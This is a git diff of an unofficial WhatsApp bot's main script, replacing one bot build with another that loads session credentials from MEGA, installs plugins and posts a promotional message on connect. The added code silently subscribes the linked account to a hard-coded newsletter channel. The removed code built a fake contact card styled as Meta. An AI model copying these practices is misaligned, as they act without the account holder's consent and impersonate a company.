@@ -1,1066 +1,817 @@
-// ================= Required Modules =================
-require("dotenv").config();
 const {
   default: makeWASocket,
   useMultiFileAuthState,
   DisconnectReason,
   jidNormalizedUser,
+  isJidBroadcast,
   getContentType,
+  proto,
+  generateWAMessageContent,
+  generateWAMessage,
+  AnyMessageContent,
+  prepareWAMessageMedia,
+  areJidsSameUser,
+  downloadContentFromMessage,
+  MessageRetryMap,
+  generateForwardMessageContent,
+  generateWAMessageFromContent,
+  generateMessageID,
+  makeInMemoryStore,
+  jidDecode,
   fetchLatestBaileysVersion,
-  Browsers,
-  makeCacheableSignalKeyStore
-} = require("@whiskeysockets/baileys");
-const { Storage } = require('megajs');
-const fs = require("fs");
-const P = require("pino");
-const path = require("path");
-const express = require("express");
-const archiver = require('archiver');
-const unzipper = require('unzipper');
-const config = require("./config");
-const { sms } = require("./lib/msg");
+  Browsers
+} = require('@whiskeysockets/baileys')
 
-// ================= Bot Identity =================
-const botName = "Senal MD";
+const l = console.log
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+const fs = require('fs')
+const ff = require('fluent-ffmpeg')
+const P = require('pino')
+const config = require('./settings')
+const GroupEvents = require('./lib/groupevents')
+const qrcode = require('qrcode-terminal')
+const StickersTypes = require('wa-sticker-formatter')
+const util = require('util')
+const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+const FileType = require('file-type')
+const axios = require('axios')
+const { File } = require('megajs')
+const { fromBuffer } = require('file-type')
+const bodyparser = require('body-parser')
+const os = require('os')
+const Crypto = require('crypto')
+const path = require('path')
+const prefix = config.PREFIX
 
-// ================= MEGA Credentials =================
-const MEGA_EMAIL = config.MEGA_EMAIL || process.env.MEGA_EMAIL;
-const MEGA_PASSWORD = config.MEGA_PASSWORD || process.env.MEGA_PASSWORD;
+const ownerNumber = ['263780934873']
 
-// ================= Bot Configuration =================
-const prefix = config.PREFIX || ".";
-const aliveImg = config.ALIVE_IMG || "https://files.catbox.moe/gm88nn.png";
-const aliveMsg = config.ALIVE_MSG || "";
-const USE_PAIRING_CODE = config.USE_PAIRING_CODE === "true" || false;
-const PAIRING_NUMBER = config.PAIRING_NUMBER || "";
-const MEGA_SESSION_URL = config.MEGA_SESSION_URL || process.env.MEGA_SESSION_URL || "";
-const SESSION_JSON = config.SESSION_JSON || process.env.SESSION_JSON || "";
-
-// ================= FAKE REPLY CONTEXT (Always Active) =================
-const chama = {
-  key: {
-    remoteJid: "status@broadcast",
-    participant: "0@s.whatsapp.net",
-    fromMe: false,
-    id: "META_AI_FAKE_ID_TS"
-  },
-  message: {
-    contactMessage: {
-      displayName: botName,
-      vcard: `BEGIN:VCARD
-VERSION:3.0
-N:${botName};;;;
-FN:${botName}
-ORG:Meta Platforms
-TEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002
-END:VCARD`
-    }
-  }
-};
-
-// ================= Owner =================
-const ownerNumber = [config.OWNER_NUMBER || "94712872326"];
-
-// ================= Session Paths =================
-const authPath = path.join(__dirname, "auth_info_baileys");
-const sessionFile = path.join(__dirname, "session_active.json");
-const sessionBackupZip = path.join(__dirname, "session_backup.zip");
-const megaSessionFile = 'senal_md_session.zip';
-
-// Create auth folder if not exists
-if (!fs.existsSync(authPath)) {
-  fs.mkdirSync(authPath, { recursive: true });
+const tempDir = path.join(os.tmpdir(), 'cache-temp')
+if (!fs.existsSync(tempDir)) {
+  fs.mkdirSync(tempDir)
 }
 
-// ================= MEGA SESSION MANAGER (BUILT-IN) =================
-class MegaSessionManager {
-  constructor() {
-    this.storage = null;
-    this.connected = false;
-  }
-
-  async connect() {
-    if (this.connected) return true;
-    
-    try {
-      console.log('🔐 Connecting to MEGA.nz...');
-      this.storage = await new Storage({
-        email: MEGA_EMAIL,
-        password: MEGA_PASSWORD
-      }).ready;
-      this.connected = true;
-      console.log('✅ Connected to MEGA.nz');
-      return true;
-    } catch (error) {
-      console.error('❌ MEGA connection failed:', error.message);
-      return false;
+const clearTempDir = () => {
+  fs.readdir(tempDir, (err, files) => {
+    if (err) throw err
+    for (const file of files) {
+      fs.unlink(path.join(tempDir, file), err => {
+        if (err) throw err
+      })
     }
-  }
-
-  async compressSession() {
-    return new Promise((resolve, reject) => {
-      if (!fs.existsSync(authPath)) {
-        reject(new Error('No session folder found'));
-        return;
-      }
-
-      const output = fs.createWriteStream(sessionBackupZip);
-      const archive = archiver('zip', { zlib: { level: 9 } });
-
-      output.on('close', () => {
-        console.log(`✅ Compressed: ${(archive.pointer() / 1024).toFixed(2)} KB`);
-        resolve(sessionBackupZip);
-      });
-
-      archive.on('error', reject);
-      archive.pipe(output);
-      archive.directory(authPath, false);
-      archive.finalize();
-    });
-  }
-
-  async extractSession(zipPath) {
-    return new Promise((resolve, reject) => {
-      // Check if it's a JSON file instead of ZIP
-      try {
-        const fileContent = fs.readFileSync(zipPath, 'utf8');
-        
-        // Try to parse as JSON first
-        try {
-          const jsonData = JSON.parse(fileContent);
-          console.log('📄 Detected JSON credentials file');
-          
-          // Ensure auth folder exists
-          if (fs.existsSync(authPath)) {
-            fs.rmSync(authPath, { recursive: true, force: true });
-          }
-          fs.mkdirSync(authPath, { recursive: true });
-          
-          // Write creds.json
-          const credsPath = path.join(authPath, 'creds.json');
-          fs.writeFileSync(credsPath, JSON.stringify(jsonData, null, 2));
-          
-          console.log('✅ JSON credentials extracted');
-          resolve(true);
-          return;
-        } catch (jsonError) {
-          // Not JSON, continue with ZIP extraction
-          console.log('📦 Processing as ZIP file');
-        }
-      } catch (readError) {
-        // File might be binary ZIP, continue with ZIP extraction
-      }
-      
-      // Extract as ZIP
-      if (fs.existsSync(authPath)) {
-        fs.rmSync(authPath, { recursive: true, force: true });
-      }
-      fs.mkdirSync(authPath, { recursive: true });
-
-      fs.createReadStream(zipPath)
-        .pipe(unzipper.Extract({ path: authPath }))
-        .on('close', () => {
-          console.log('✅ Session extracted');
-          resolve(true);
-        })
-        .on('error', reject);
-    });
-  }
-
-  async uploadSession() {
-    try {
-      if (!this.connected) await this.connect();
-      if (!this.connected) throw new Error('Not connected to MEGA');
-
-      console.log('📤 Uploading session to MEGA...');
-      await this.compressSession();
-
-      // Remove old session if exists
-      const existingFile = this.storage.root.children.find(
-        file => file.name === megaSessionFile
-      );
-      if (existingFile) {
-        console.log('🗑️ Removing old session...');
-        await existingFile.delete();
-      }
-
-      // Upload new session
-      const fileData = fs.readFileSync(sessionBackupZip);
-      const uploadedFile = await this.storage.upload(megaSessionFile, fileData).complete;
-      const shareLink = await uploadedFile.link();
-      const sessionId = shareLink.split('/file/')[1];
-
-      console.log('✅ Session uploaded to MEGA!');
-      console.log('🔎 Share Link:', shareLink);
-      console.log('🔑 Session ID:', sessionId);
-
-      // Save session ID
-      this.saveSessionId(sessionId);
-
-      // Cleanup
-      if (fs.existsSync(sessionBackupZip)) {
-        fs.unlinkSync(sessionBackupZip);
-      }
-
-      return sessionId;
-    } catch (error) {
-      console.error('❌ Upload failed:', error.message);
-      throw error;
-    }
-  }
-
-  async downloadSession(sessionId = null) {
-    try {
-      console.log('📥 Downloading session from MEGA...');
-
-      if (sessionId) {
-        // Download using direct link or session ID
-        const { File } = require('megajs');
-        let fileUrl;
-        
-        // Check if it's a full URL or just session ID
-        if (sessionId.startsWith('http')) {
-          fileUrl = sessionId;
-          console.log('🔗 Using full MEGA URL');
-        } else {
-          fileUrl = `https://mega.nz/file/${sessionId}`;
-          console.log('🔑 Using Session ID');
-        }
-        
-        const file = File.fromURL(fileUrl);
-        
-        return new Promise((resolve, reject) => {
-          const writeStream = fs.createWriteStream(sessionBackupZip);
-          
-          file.download()
-            .pipe(writeStream)
-            .on('finish', async () => {
-              console.log('✅ Downloaded from MEGA');
-              
-              try {
-                await this.extractSession(sessionBackupZip);
-                if (fs.existsSync(sessionBackupZip)) {
-                  fs.unlinkSync(sessionBackupZip);
-                }
-                resolve(true);
-              } catch (extractError) {
-                console.error('❌ Extraction failed:', extractError.message);
-                if (fs.existsSync(sessionBackupZip)) {
-                  fs.unlinkSync(sessionBackupZip);
-                }
-                reject(extractError);
-              }
-            })
-            .on('error', (error) => {
-              console.error('❌ Download stream error:', error.message);
-              if (fs.existsSync(sessionBackupZip)) {
-                fs.unlinkSync(sessionBackupZip);
-              }
-              reject(error);
-            });
-        });
-      } else {
-        // Download from logged-in storage
-        if (!this.connected) await this.connect();
-        if (!this.connected) throw new Error('Not connected to MEGA');
-
-        const file = this.storage.root.children.find(f => f.name === megaSessionFile);
-        if (!file) throw new Error('Session not found in MEGA');
-
-        const data = await file.downloadBuffer();
-        fs.writeFileSync(sessionBackupZip, data);
-        await this.extractSession(sessionBackupZip);
-        if (fs.existsSync(sessionBackupZip)) {
-          fs.unlinkSync(sessionBackupZip);
-        }
-        return true;
-      }
-    } catch (error) {
-      console.error('❌ Download failed:', error.message);
-      throw error;
-    }
-  }
-
-  saveSessionId(sessionId) {
-    // Save to .env
-    const envPath = path.join(__dirname, '.env');
-    if (fs.existsSync(envPath)) {
-      let envContent = fs.readFileSync(envPath, 'utf8');
-      if (envContent.includes('SESSION_ID=')) {
-        envContent = envContent.replace(/SESSION_ID=.*/g, `SESSION_ID=${sessionId}`);
-      } else {
-        envContent += `\nSESSION_ID=${sessionId}\n`;
-      }
-      fs.writeFileSync(envPath, envContent);
-    }
-
-    // Save to JSON
-    const configPath = path.join(__dirname, 'mega_session.json');
-    const sessionConfig = {
-      sessionId: sessionId,
-      uploadedAt: new Date().toISOString(),
-      email: MEGA_EMAIL
-    };
-    fs.writeFileSync(configPath, JSON.stringify(sessionConfig, null, 2));
-    console.log('✅ Session ID saved');
-  }
-
-  loadSessionId() {
-    const configPath = path.join(__dirname, 'mega_session.json');
-    if (fs.existsSync(configPath)) {
-      const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
-      return config.sessionId;
-    }
-    return null;
-  }
-
-  async getMegaStatus() {
-    try {
-      if (!this.connected) await this.connect();
-      if (!this.connected) return { success: false, error: 'Not connected' };
-
-      const sessionId = this.loadSessionId();
-      const file = this.storage.root.children.find(f => f.name === megaSessionFile);
-      
-      return {
-        success: true,
-        email: MEGA_EMAIL,
-        connected: this.connected,
-        hasSessionId: !!sessionId,
-        sessionId: sessionId,
-        hasBackup: !!file,
-        backupSize: file ? `${(file.size / 1024).toFixed(2)} KB` : 'N/A',
-        backupDate: file ? new Date(file.timestamp * 1000).toISOString() : 'N/A'
-      };
-    } catch (error) {
-      return { success: false, error: error.message };
-    }
-  }
-
-  hasLocalSession() {
-    return fs.existsSync(path.join(authPath, 'creds.json'));
-  }
-
-  async autoSync() {
-    const hasLocal = this.hasLocalSession();
-    const savedSessionId = this.loadSessionId();
-    const megaUrl = MEGA_SESSION_URL;
-
-    console.log('\n' + '='.repeat(60));
-    console.log('🔄 MEGA AUTO-SYNC');
-    console.log('='.repeat(60));
-
-    // Priority 1: Use MEGA_SESSION_URL from env/config
-    if (!hasLocal && megaUrl) {
-      console.log('🔗 MEGA URL found in config');
-      console.log('📥 Restoring from MEGA URL...');
-      try {
-        await this.downloadSession(megaUrl);
-        console.log('✅ Session restored from MEGA URL!');
-        return 'downloaded';
-      } catch (error) {
-        console.log('⚠️ MEGA URL restore failed:', error.message);
-        console.log('💡 Trying other methods...');
-      }
-    }
-
-    // Priority 2: Use saved Session ID
-    if (!hasLocal && savedSessionId) {
-      console.log('🔑 Session ID found');
-      console.log('📥 Restoring from Session ID...');
-      try {
-        await this.downloadSession(savedSessionId);
-        console.log('✅ Session restored from Session ID!');
-        return 'downloaded';
-      } catch (error) {
-        console.log('⚠️ Session ID restore failed - will create new session');
-        return 'none';
-      }
-    } else if (hasLocal) {
-      console.log('✅ Local session exists');
-      return 'local';
-    } else {
-      console.log('📱 No session found - scan QR to create new session');
-      return 'none';
-    }
-  }
+  })
 }
 
-// Initialize MEGA manager
-let megaManager = null;
-let megaSetupDone = false;
+// Clear the temp directory every 5 minutes
+setInterval(clearTempDir, 5 * 60 * 1000)
 
-if (MEGA_EMAIL && MEGA_PASSWORD) {
-  megaManager = new MegaSessionManager();
+//===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
+  const sessdata = config.SESSION_ID.replace("lite~", '')
+  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
+  filer.download((err, data) => {
+    if (err) throw err
+    fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+      console.log("[ 📥 ] Session downloaded ✅")
+    })
+  })
 }
 
-// One-time MEGA setup check
-async function checkMegaSetup() {
-  if (!megaManager || megaSetupDone) return;
-  
-  const setupFile = path.join(__dirname, '.mega_setup_done');
-  
-  // Check if setup was already done
-  if (fs.existsSync(setupFile)) {
-    megaSetupDone = true;
-    return;
-  }
-  
-  console.log('\n' + '='.repeat(60));
-  console.log('🔧 MEGA FIRST-TIME SETUP CHECK');
-  console.log('='.repeat(60));
-  
-  try {
-    // Test MEGA connection
-    console.log('📡 Testing MEGA connection...');
-    const connected = await megaManager.connect();
-    
-    if (connected) {
-      console.log('✅ MEGA connection successful!');
-      console.log('📧 Email: ' + MEGA_EMAIL);
-      
-      // Check if session exists in MEGA
-      const sessionId = megaManager.loadSessionId();
-      if (sessionId) {
-        console.log('🔑 Existing Session ID found: ' + sessionId);
-        
-        try {
-          const file = megaManager.storage.root.children.find(
-            f => f.name === megaSessionFile
-          );
-          if (file) {
-            const fileSize = (file.size / 1024).toFixed(2);
-            console.log(`✅ Session backup found in MEGA (${fileSize} KB)`);
-          } else {
-            console.log('⚠️ Session ID exists but file not found in MEGA');
-            console.log('💡 Will create new backup after QR scan');
-          }
-        } catch (err) {
-          console.log('⚠️ Could not verify session file');
-        }
-      } else {
-        console.log('📱 No session ID found - first time setup');
-        console.log('💡 After scanning QR, session will auto-backup to MEGA');
-      }
-      
-      // Mark setup as done
-      fs.writeFileSync(setupFile, JSON.stringify({
-        setupAt: new Date().toISOString(),
-        email: MEGA_EMAIL
-      }));
-      megaSetupDone = true;
-      
-      console.log('✅ MEGA setup check complete!');
-      console.log('='.repeat(60) + '\n');
-      
-    } else {
-      console.log('❌ MEGA connection failed!');
-      console.log('⚠️ Check your MEGA_EMAIL and MEGA_PASSWORD in .env');
-      console.log('🔄 Bot will continue without MEGA backup');
-      console.log('='.repeat(60) + '\n');
-    }
-    
-  } catch (error) {
-    console.log('❌ MEGA setup error:', error.message);
-    console.log('⚠️ Please verify your MEGA credentials');
-    console.log('🔄 Bot will continue without MEGA backup');
-    console.log('='.repeat(60) + '\n');
-  }
-}
+const express = require("express")
+const app = express()
+const port = process.env.PORT || 9090
 
-// ================= Session Helper Functions =================
-function createSessionFromJSON(jsonData) {
-  try {
-    console.log('📝 Creating session from JSON credentials...');
-    
-    // Ensure auth folder exists
-    if (!fs.existsSync(authPath)) {
-      fs.mkdirSync(authPath, { recursive: true });
-    }
-    
-    // Parse JSON if it's a string
-    const credsData = typeof jsonData === 'string' ? JSON.parse(jsonData) : jsonData;
-    
-    // Write creds.json
-    const credsPath = path.join(authPath, 'creds.json');
-    fs.writeFileSync(credsPath, JSON.stringify(credsData, null, 2));
-    
-    console.log('✅ Session credentials saved to auth_info_baileys/creds.json');
-    return true;
-  } catch (error) {
-    console.error('❌ Failed to create session from JSON:', error.message);
-    return false;
-  }
-}
+let conn // ✅ GLOBAL conn declaration
 
-function isSessionValid() {
-  try {
-    const credsPath = path.join(authPath, "creds.json");
-    if (fs.existsSync(sessionFile) && fs.existsSync(credsPath)) {
-      const credsData = JSON.parse(fs.readFileSync(credsPath, "utf8"));
-      if (credsData?.me?.id) {
-        console.log(`✅ Valid session: ${credsData.me.id.split(':')[0]}`);
-        return true;
-      }
-    }
-    return false;
-  } catch (error) {
-    return false;
-  }
-}
+//=============================================
 
-function markSessionActive(phoneNumber) {
-  const sessionData = {
-    active: true,
-    phoneNumber: phoneNumber,
-    createdAt: new Date().toISOString(),
-    lastConnected: new Date().toISOString()
-  };
-  fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
-}
-
-function updateSessionTime() {
-  try {
-    if (fs.existsSync(sessionFile)) {
-      const sessionData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
-      sessionData.lastConnected = new Date().toISOString();
-      fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
-    }
-  } catch (error) {}
-}
-
-function clearSession() {
-  try {
-    if (fs.existsSync(authPath)) {
-      fs.rmSync(authPath, { recursive: true, force: true });
-      console.log("🗑️ Cleared session folder");
-    }
-    if (fs.existsSync(sessionFile)) {
-      fs.unlinkSync(sessionFile);
-    }
-  } catch (error) {}
-}
-
-// ================= Express Server =================
-const app = express();
-const port = process.env.PORT || 8000;
-
-app.get("/", (req, res) => {
-  const megaStatus = megaSetupDone ? '✅ Connected' : (MEGA_EMAIL ? '⏳ Checking...' : '❌ Not configured');
-  res.send(`
-    <html>
-      <head><title>Senal MD Bot</title></head>
-      <body style="font-family: Arial; padding: 50px; text-align: center;">
-        <h1>✅ ${botName} is Running!</h1>
-        <p>Status: <strong>${isSessionValid() ? 'Connected ✅' : 'Waiting for QR 📱'}</strong></p>
-        <p>MEGA Backup: <strong>${megaStatus}</strong></p>
-        ${MEGA_EMAIL ? `<p>MEGA Email: <strong>${MEGA_EMAIL}</strong></p>` : ''}
-        <hr>
-        <p><a href="/mega-status">Check MEGA Status</a></p>
-      </body>
-    </html>
-  `);
-});
-
-app.get("/mega-status", async (req, res) => {
-  if (!megaManager) {
-    res.send(`
-      <html>
-        <head><title>MEGA Status</title></head>
-        <body style="font-family: Arial; padding: 50px;">
-          <h2>❌ MEGA Not Configured</h2>
-          <p>Add MEGA_EMAIL and MEGA_PASSWORD to .env file</p>
-          <a href="/">← Back</a>
-        </body>
-      </html>
-    `);
-    return;
-  }
-
-  try {
-    const status = await megaManager.getMegaStatus();
-    
-    res.send(`
-      <html>
-        <head><title>MEGA Status</title></head>
-        <body style="font-family: Arial; padding: 50px;">
-          <h2>☁️ MEGA Status</h2>
-          ${status.success ? `
-            <p>✅ <strong>Connected</strong></p>
-            <p>📧 Email: <strong>${status.email}</strong></p>
-            <p>🔑 Session ID: <strong>${status.hasSessionId ? '✅ Exists' : '❌ None'}</strong></p>
-            ${status.hasSessionId ? `<p>ID: <code>${status.sessionId}</code></p>` : ''}
-            <p>💾 Backup File: <strong>${status.hasBackup ? '✅ Found' : '❌ Not Found'}</strong></p>
-            ${status.hasBackup ? `
-              <p>📦 Size: <strong>${status.backupSize}</strong></p>
-              <p>📅 Date: <strong>${new Date(status.backupDate).toLocaleString()}</strong></p>
-            ` : ''}
-          ` : `
-            <p>❌ <strong>Error:</strong> ${status.error}</p>
-          `}
-          <hr>
-          <a href="/">← Back</a>
-        </body>
-      </html>
-    `);
-  } catch (error) {
-    res.send(`
-      <html>
-        <head><title>MEGA Status</title></head>
-        <body style="font-family: Arial; padding: 50px;">
-          <h2>❌ Error</h2>
-          <p>${error.message}</p>
-          <a href="/">← Back</a>
-        </body>
-      </html>
-    `);
-  }
-});
-
-app.listen(port, () =>
-  console.log(`🌐 Server: http://localhost:${port}`)
-);
-
-// ================= QR Display =================
-function displayQR(qr) {
-  console.log("\n" + "=".repeat(50));
-  console.log("📱 SCAN THIS QR CODE WITH WHATSAPP");
-  console.log("=".repeat(50));
-  console.log("\n" + qr + "\n");
-  console.log("=".repeat(50));
-  console.log("⏰ Scan within 20 seconds!");
-  console.log("📲 WhatsApp → Linked Devices → Link a Device");
-  console.log("=".repeat(50) + "\n");
-}
-
-// ================= Connection Tracking =================
-let reconnectAttempts = 0;
-const MAX_RECONNECT_ATTEMPTS = 5;
-let isConnecting = false;
-let connectionTimeout = null;
-let lastConnectionAttempt = 0;
-const MIN_CONNECTION_INTERVAL = 10000; // Minimum 10 seconds between attempts
-
-// Clear any pending connection timeout
-function clearConnectionTimeout() {
-  if (connectionTimeout) {
-    clearTimeout(connectionTimeout);
-    connectionTimeout = null;
-  }
-}
-
-// ================= Connect to WhatsApp =================
 async function connectToWA() {
-  if (isConnecting) {
-    console.log("⏳ Connection already in progress, skipping...");
-    return;
-  }
-
-  // Enforce minimum interval between connection attempts
-  const now = Date.now();
-  const timeSinceLastAttempt = now - lastConnectionAttempt;
-  if (timeSinceLastAttempt < MIN_CONNECTION_INTERVAL) {
-    const waitTime = MIN_CONNECTION_INTERVAL - timeSinceLastAttempt;
-    console.log(`⏳ Cooling down... waiting ${(waitTime/1000).toFixed(1)}s`);
-    clearConnectionTimeout();
-    connectionTimeout = setTimeout(() => connectToWA(), waitTime);
-    return;
-  }
-
   try {
-    isConnecting = true;
-    lastConnectionAttempt = Date.now();
-    clearConnectionTimeout(); // Clear any pending reconnection
-    
-    console.log(`\n🔌 Connection attempt #${reconnectAttempts + 1}`);
-    
-    // ================= Check for SESSION_JSON =================
-    if (SESSION_JSON && !isSessionValid()) {
-      console.log('\n' + '='.repeat(60));
-      console.log('🔑 SESSION_JSON DETECTED');
-      console.log('='.repeat(60));
-      
-      const sessionCreated = createSessionFromJSON(SESSION_JSON);
-      if (sessionCreated) {
-        console.log('✅ Session created from JSON credentials');
-        console.log('🔄 Proceeding to connect...');
-        console.log('='.repeat(60) + '\n');
-      } else {
-        console.log('⚠️ Failed to create session from JSON');
-        console.log('='.repeat(60) + '\n');
-      }
-    }
-    
-    // ================= MEGA AUTO-SYNC =================
-    if (megaManager) {
-      try {
-        await megaManager.autoSync();
-      } catch (error) {
-        console.log('⚠️ MEGA sync failed:', error.message);
-      }
-    } else {
-      console.log('💡 Add MEGA_EMAIL & MEGA_PASSWORD to .env for auto-backup');
-    }
-    
-    const hasValidSession = isSessionValid();
-    
-    if (hasValidSession) {
-      console.log("🔄 Restoring session...");
-    } else {
-      console.log("📱 Preparing QR code...");
-    }
+    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")
 
-    const { state, saveCreds } = await useMultiFileAuthState(authPath);
-    
-    // Use latest Baileys version with fallback
-    let version;
-    try {
-      const latest = await fetchLatestBaileysVersion();
-      version = latest.version;
-      console.log(`📱 Using Baileys version: [${version.join('.')}]`);
-    } catch (error) {
-      version = [2, 3000, 1015901307]; // Fallback version
-      console.log(`📱 Using fallback version: [${version.join('.')}]`);
-    }
+    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+    const { version } = await fetchLatestBaileysVersion()
 
-    const conn = makeWASocket({
-      version,
-      logger: P({ level: "silent" }),
-      printQRInTerminal: !hasValidSession, // Only print QR if no session
-      browser: Browsers.ubuntu("Chrome"), // Changed from macOS to Ubuntu
-      auth: {
-        creds: state.creds,
-        keys: makeCacheableSignalKeyStore(state.keys, P({ level: "silent" }))
-      },
-      syncFullHistory: false,
-      markOnlineOnConnect: false,
-      generateHighQualityLinkPreview: false, // Disabled to reduce load
-      getMessage: async () => ({ conversation: "" }),
-      defaultQueryTimeoutMs: 120000, // Increased to 2 minutes
-      connectTimeoutMs: 120000,
-      keepAliveIntervalMs: 30000,
-      retryRequestDelayMs: 5000, // Increased delay
-      maxMsgRetryCount: 2, // Reduced retry attempts
-      qrTimeout: 60000, // 60 second QR timeout
-      emitOwnEvents: false, // Don't emit events for own messages
-      fireInitQueries: false, // Don't fire initial queries
-    });
+    conn = makeWASocket({
+      logger: P({ level: 'silent' }),
+      printQRInTerminal: false,
+      browser: Browsers.macOS("Firefox"),
+      syncFullHistory: true,
+      auth: state,
+      version
+    })
 
-    global.conn = conn;
+    conn.ev.on('connection.update', async (update) => {
+      const { connection, lastDisconnect } = update
 
-    // ================= Connection Handler =================
-    let qrScanned = false;
-    let pairingCodeRequested = false;
-    
-    conn.ev.on("connection.update", async (update) => {
-      const { connection, lastDisconnect, qr } = update;
-      
-      // Handle QR code or pairing code
-      if (qr && !hasValidSession && !qrScanned) {
-        if (USE_PAIRING_CODE && PAIRING_NUMBER && !pairingCodeRequested) {
-          pairingCodeRequested = true;
-          console.log("\n" + "=".repeat(50));
-          console.log("📱 PAIRING CODE MODE");
-          console.log("=".repeat(50));
+      if (connection === 'close') {
+        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+        if (shouldReconnect) {
+          await connectToWA()
+        }
+      } else if (connection === 'open') {
+        try {
+          console.log('[ 🧬 ] Installing Plugins')
+
+          fs.readdirSync("./plugins/").forEach((plugin) => {
+            if (path.extname(plugin).toLowerCase() === ".js") {
+              require("./plugins/" + plugin)
+            }
+          })
+
+          console.log('[ ✔ ] Plugins installed successfully ✅')
+          console.log('[ 🪀 ] Bot connected to WhatsApp 📲')
+
+          let up = `*Hᴇʟʟᴏ ᴛʜᴇʀᴇ ʟɪᴛᴇ xᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ! 👋🏻* 
+
+*ᴋᴇᴇᴘ ᴏɴ ᴜsɪɴɢ ᴍᴀʟᴠɪɴ ᴍᴏᴅs🚩* 
+
+> sᴜʙsᴄʀɪʙᴇ ʏᴛ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴛᴜᴛᴏʀɪᴀʟs
+https://youtube.com/@malvintech2
+
+- *ʏᴏᴜʀ ʙᴏᴛ ᴘʀᴇғɪx: ➡️[ . ]*
+> - ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ᴜʀ ᴘʀᴇғɪx ᴜsɪɴɢ ᴛʜᴇ .ᴘʀᴇғɪx ᴄᴏᴍᴍᴀɴᴅ
+
+> ᴅᴏɴᴛ ғᴏʀɢᴇᴛ ᴛᴏ sʜᴀʀᴇ, sᴛᴀʀ & ғᴏʀᴋ ᴛʜᴇ ʀᴇᴘᴏ ⬇️ 
+https://github.com/XdKing2/LITE-XD
+
+> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴀʟᴠɪɴ ᴋɪɴɢ 🇿🇼`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/lm4a0b.jpg` }, caption: up })
+
+          const channelJid = "120363402507750390@newsletter"
           try {
-            const code = await conn.requestPairingCode(PAIRING_NUMBER);
-            console.log(`🔑 Pairing Code: ${code}`);
-            console.log("📲 Enter this code in WhatsApp:");
-            console.log("   Settings → Linked Devices → Link a Device");
-            console.log("   → Link with phone number instead");
-            console.log("=".repeat(50) + "\n");
-          } catch (err) {
-            console.log("❌ Pairing code failed:", err.message);
-            console.log("🔄 Falling back to QR code...\n");
-            displayQR(qr);
+            await conn.newsletterFollow(channelJid)
+            console.log(`Successfully followed channel: ${channelJid}`)
+          } catch (error) {
+            console.error(`Failed to follow channel: ${error}`)
           }
-        } else {
-          displayQR(qr);
+
+        } catch (error) {
+          console.error("[ ❌ ] Error during post-connect setup:", error)
         }
       }
-      
-      if (connection === "close") {
-        isConnecting = false;
-        const statusCode = lastDisconnect?.error?.output?.statusCode;
-        const reason = lastDisconnect?.error?.message || "Unknown";
-        
-        console.log(`\n❌ Disconnected: ${statusCode} - ${reason}`);
-        
-        // ================= Handle Errors with MEGA Restore =================
-        if (statusCode === DisconnectReason.badSession) {
-          console.log("⚠️ Bad session detected");
-          
-          if (megaManager && megaManager.loadSessionId()) {
-            try {
-              console.log("🔄 Restoring from MEGA...");
-              await megaManager.downloadSession(megaManager.loadSessionId());
-              console.log("✅ Restored from MEGA!");
-              reconnectAttempts = 0;
-              clearConnectionTimeout();
-              connectionTimeout = setTimeout(() => connectToWA(), 3000);
-              return;
-            } catch (error) {
-              console.log("⚠️ MEGA restore failed - clearing session");
-            }
-          }
-          
-          clearSession();
-          reconnectAttempts = 0;
-          clearConnectionTimeout();
-          connectionTimeout = setTimeout(() => connectToWA(), 3000);
-          
-        } else if (statusCode === 405) {
-          console.log("⚠️ 405 Error - Connection rate limited or network issue");
-          reconnectAttempts++;
-          
-          if (reconnectAttempts > 2) { // Reduced from 3 to 2
-            console.log("🔄 Too many 405 errors - waiting 5 minutes before retry");
-            console.log("💡 Possible causes:");
-            console.log("   - IP rate limited by WhatsApp");
-            console.log("   - Too many connection attempts");
-            console.log("   - Network/firewall blocking");
-            clearSession();
-            reconnectAttempts = 0;
-            clearConnectionTimeout();
-            connectionTimeout = setTimeout(() => connectToWA(), 300000); // Wait 5 minutes
-          } else {
-            console.log(`⏳ Retry ${reconnectAttempts}/2 in 60 seconds...`);
-            clearConnectionTimeout();
-            connectionTimeout = setTimeout(() => connectToWA(), 60000); // Wait 60 seconds
-          }
-          
-        } else if (statusCode === DisconnectReason.connectionClosed) {
-          reconnectAttempts++;
-          if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
-            clearConnectionTimeout();
-            connectionTimeout = setTimeout(() => connectToWA(), 5000);
-          } else {
-            clearSession();
-            reconnectAttempts = 0;
-            clearConnectionTimeout();
-            connectionTimeout = setTimeout(() => connectToWA(), 10000);
-          }
-          
-        } else if (statusCode === DisconnectReason.loggedOut) {
-          console.log("❌ Logged out. Clearing session...");
-          clearSession();
-          clearConnectionTimeout();
-          connectionTimeout = setTimeout(() => connectToWA(), 5000);
-          
-        } else if (statusCode === DisconnectReason.restartRequired) {
-          clearConnectionTimeout();
-          connectionTimeout = setTimeout(() => connectToWA(), 2000);
-          
-        } else {
-          clearConnectionTimeout();
-          connectionTimeout = setTimeout(() => connectToWA(), 10000);
-        }
-        
-      } else if (connection === "connecting") {
-        console.log("⏳ Connecting...");
-        
-      } else if (connection === "open") {
-        isConnecting = false;
-        reconnectAttempts = 0;
